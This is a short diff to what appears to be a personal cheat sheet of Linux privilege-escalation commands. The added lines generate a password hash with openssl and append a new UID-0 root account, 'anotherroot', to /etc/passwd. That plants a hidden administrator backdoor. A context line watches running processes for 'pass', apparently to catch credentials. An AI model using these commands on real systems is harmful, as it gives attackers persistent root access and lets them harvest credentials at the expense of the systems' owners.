@@ -1,5 +1,8 @@
 # /etc/passwd write:
-# If a password hash in the second column of /etc/passwd , it takes first over the entry in /etc/shadow
+# If a password hash in the second column of /etc/passwd , it takes first over the entry in /etc/shadow.
+# Open SSL can use the default crypt, but some old sys can use DES or MD5
+openssl passwd r00t
+echo "anotherroot:XXXXXXX:0:0:root:/root:/bin/bash" >> /etc/passwd
 
 # Wactch repeat the command to be like real time:
 watch -n 1 "ps -aux | grep pass"
